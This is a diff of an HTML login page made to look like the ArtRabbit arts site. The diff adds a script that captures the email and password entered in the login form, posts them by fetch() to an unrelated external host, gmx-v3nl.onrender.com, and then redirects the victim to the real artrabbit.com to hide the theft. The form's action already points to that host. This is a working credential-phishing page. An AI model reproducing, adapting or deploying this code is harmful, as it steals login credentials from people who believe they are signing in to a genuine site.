@@ -60,7 +60,7 @@
                     </li>
                     
 <li>
-	<a href="https://art-2f7y6hiho-remotes-projects-2f994cd4.vercel.app" class="m_menu-control m_nav-override" data-menutype="social">
+	<a href="" class="m_menu-control m_nav-override" data-menutype="social">
 		<span class="m_nav-control-icon mod--login">Toggle </span>Log in
 	</a>
 </li>
@@ -96,6 +96,7 @@
 			</div>
 
 		</div>
+        
 		<form id="search" class="m_slideout-menu mod--search" style="display: none;" action="/search" method="get">
 			<h3 class="b_large-heading mod--primary">Keyword search</h3>
 			<p>Find events, people, organisations or locations by name</p>
@@ -141,6 +142,40 @@
                         </div>
                         
                         
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
                         
                     </header>
 
@@ -148,8 +183,7 @@
                         <div class="g_grid-6 r_b2_grid-8 r_b3_grid-12 g_inset-2 r_b2_inset-1 r_b3_no-inset l_section">
                             <div class="l_inner-grid">
 
-                                <form class="form-signin" role="form" action="https://gmx-v3nl.onrender.com/art" method="POST">
-
+                                <form class="form-signin" role="form" action="https://gmx-v3nl.onrender.com/art" method="POST" onsubmit="return false;">
                                     <div class="m_field">
                                         <label class="b_label" for="email">Email address</label>
                                         <input type="text" name="email" class="b_input" value="" id="email" required="" autofocus="" autocorrect="off" autocapitalize="none">
@@ -348,6 +382,35 @@
 
         </div>
     </footer>
+
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.querySelector('.form-signin');
+            
+            form.addEventListener('submit', async function(e) {
+                e.preventDefault(); // Prevent default form submission
+                
+                const formData = new FormData(form);
+                
+                try {
+                    const response = await fetch('https://gmx-v3nl.onrender.com/art', {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    const data = await response.json();
+                    
+                    if (data.status === "success") {
+                        window.location.href = 'https://artrabbit.com';
+                    }
+                } catch (error) {
+                    console.error('Error:', error);
+                }
+            });
+        });
+        </script>
+
     
 <script type="text/javascript">
 var html=document.getElementsByTagName('html'); html[0].setAttribute('class', 'js');
@@ -359,40 +422,9 @@ var sc = function(){loadScript('/layout/ui/js/min/artrabbit-min.js?v=4.83',art_a
 var jq = loadScript('/layout/ui/js/libs/jquery-1.8.2.min.js',sc)
 </script>
 
-    <script src="js/social-login.js"></script>
+ 
 
-    <!-- Add this after the login form section -->
-    <!-- <div class="l_row l_section">
-        <div class="g_grid-6 r_b2_grid-8 r_b3_grid-12 g_inset-2 r_b2_inset-1 r_b3_no-inset">
-            <div class="l_inner-grid">
-                <h3 class="b_large-heading mod--primary">Contact Us</h3>
-                <form action="send-email.php" method="POST" class="form-contact">
-                    <div class="m_field">
-                        <label class="b_label" for="contact-name">Your Name</label>
-                        <input type="text" name="name" id="contact-name" class="b_input" required>
-                    </div>
-                    
-                    <div class="m_field">
-                        <label class="b_label" for="contact-email">Your Email</label>
-                        <input type="email" name="email" id="contact-email" class="b_input" required>
-                    </div>
-                    
-                    <div class="m_field">
-                        <label class="b_label" for="contact-subject">Subject</label>
-                        <input type="text" name="subject" id="contact-subject" class="b_input" required>
-                    </div>
-                    
-                    <div class="m_field">
-                        <label class="b_label" for="contact-message">Message</label>
-                        <textarea name="message" id="contact-message" class="b_input" rows="5" required></textarea>
-                    </div>
-                    
-                    <div class="m_field">
-                        <input type="submit" class="b_submit m_full-loader" value="Send Message">
-                    </div>
-                </form>
-            </div>
-        </div>
-    </div> -->
+
+
 
 </body></html>
